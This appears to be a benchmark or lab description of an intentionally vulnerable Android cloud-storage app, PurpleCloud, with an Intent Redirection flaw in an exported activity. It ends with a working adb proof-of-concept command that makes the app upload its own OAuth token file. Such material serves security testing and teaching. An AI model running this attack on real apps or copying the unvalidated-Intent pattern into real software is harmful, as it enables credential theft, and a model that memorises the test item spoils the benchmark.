# oxo-android-ben35 Intent Redirection Vulnerability

### Application

PurpleCloud is a cloud storage app that allows users to store, manage, upload, download, and organize their files in remote storage.

The application has an **Intent Redirection vulnerability** in its notification handling logic. Specifically, the app includes an exported activity named `NotificationDispatcherActivity` that accepts a string extra containing an `Intent` URI. This string is parsed into a full `Intent` object and launched without any validation.

This allows malicious applications to supply crafted `Intent` URIs that get executed with the **identity and permissions of the PurpleCloud app**, effectively bypassing Android’s component protection.

### Vulnerability Type and Category
- **Type:** Intent Redirection (Improper Input Validation)
- **Category:** Insecure Inter-Component Communication (ICC)

### Difficulty
Medium

### Mobile Application

- Introduces an exported activity: `NotificationDispatcherActivity`.
- This activity accepts an extra string key:
  - `com.purpleapps.purplecloud.REDIRECT_INTENT` → contains an `Intent` URI string.
- The string is parsed into an `Intent` and launched blindly.
- An attacker can craft malicious Intents to launch private components, such as `UploadActivity`, with attacker-controlled extras.

### Exploitation

1. Install and log into PurpleCloud as a normal user.
2. Execute the following command from `adb` (or simulate via a malicious app installed on the device):

```bash
adb shell am start -n com.purpleapps.purplecloud/.NotificationDispatcherActivity \
  --es com.purpleapps.purplecloud.REDIRECT_INTENT \
  "intent:#Intent;action=com.purpleapps.purplecloud.action.UPLOAD;\
  component=com.purpleapps.purplecloud/.UploadActivity;\
  S.com.purpleapps.purplecloud.extra.FILE_PATH=/data/data/com.purpleapps.purplecloud/shared_prefs/AuthPrefs.xml;\
  S.com.purpleapps.purplecloud.extra.LOGICAL_PATH=stolen_auth.xml;end"
```

The result is uploading OAuth2.0 tokens to the remote PurpleCloud storage.
